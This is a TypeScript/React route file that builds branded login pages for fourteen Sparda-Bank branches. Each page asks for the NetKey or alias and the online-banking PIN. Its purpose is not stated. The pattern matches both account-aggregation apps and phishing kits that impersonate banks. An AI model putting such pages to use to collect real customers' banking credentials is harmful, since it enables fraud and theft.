import { createFileRoute, notFound } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const branches = [
  "Sparda-Bank Augsburg",
  "Sparda-Bank Baden-Württemberg",
  "Sparda-Bank Berlin",
  "Sparda-Bank Hamburg",
  "Sparda-Bank Hannover",
  "Sparda-Bank Hessen",
  "Sparda-Bank München",
  "Sparda-Bank Nürnberg",
  "Sparda-Bank Ostbayern",
  "Sparda-Bank Südwest",
  "Sparda-Bank West Düsseldorf",
  "Sparda-Bank West Köln",
  "Sparda-Bank West Münster",
  "Sparda-Bank West Wuppertal",
];

export function slugifySparda(name: string): string {
  return name
    .toLowerCase()
    .replace(/ä/g, "ae").replace(/ö/g, "oe").replace(/ü/g, "ue").replace(/ß/g, "ss")
    .replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
}

const bySlug: Record<string, string> = Object.fromEntries(
  branches.map((n) => [slugifySparda(n), n])
);

export const Route = createFileRoute("/bank/sparda-bank/$slug")({
  component: SpardaBranchLogin,
});

function SpardaBranchLogin() {
  const { slug } = Route.useParams();
  const name = bySlug[slug];
  if (!name) throw notFound();
  return (
    <BankLoginPage
      idPrefix={`sparda-${slug}`}
      logoSlug="sparda-bank"
      title={name}
      field1Label="Sparda-NetKey oder Alias"
      field2Label="PIN"
      field2Tooltip="Online-Banking PIN, nicht die 4-stellige PIN Ihrer EC-/Maestro-Karte"
      backTo="/bank/sparda-bank"
    />
  );
}
